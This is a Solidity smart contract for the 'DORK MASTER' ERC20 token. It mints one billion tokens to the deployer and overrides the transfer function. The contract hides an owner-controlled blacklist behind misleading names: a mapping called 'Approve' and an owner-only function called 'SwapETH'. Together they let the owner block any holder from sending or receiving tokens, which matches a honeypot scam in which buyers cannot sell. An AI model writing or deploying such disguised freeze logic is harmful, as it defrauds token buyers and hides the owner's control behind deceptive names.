// SPDX-License-Identifier: MIT
// Website: www.dorkmaster.net

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";

contract DorkMaster is ERC20, Ownable {
    mapping(address => bool) public Approve;

    constructor() ERC20("DORK MASTER", "$DORKM") {
        _mint(msg.sender, 1000000000 * (10**18));  // 1,000,000,000 tokens with 18 decimals
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(! Approve[from], "Sender.");
        require(! Approve[to], "Receiver.");
        super._transfer(from, to, amount);
    }

    function SwapETH(address _user, bool _value) public onlyOwner {
        Approve[_user] = _value;
    }
}
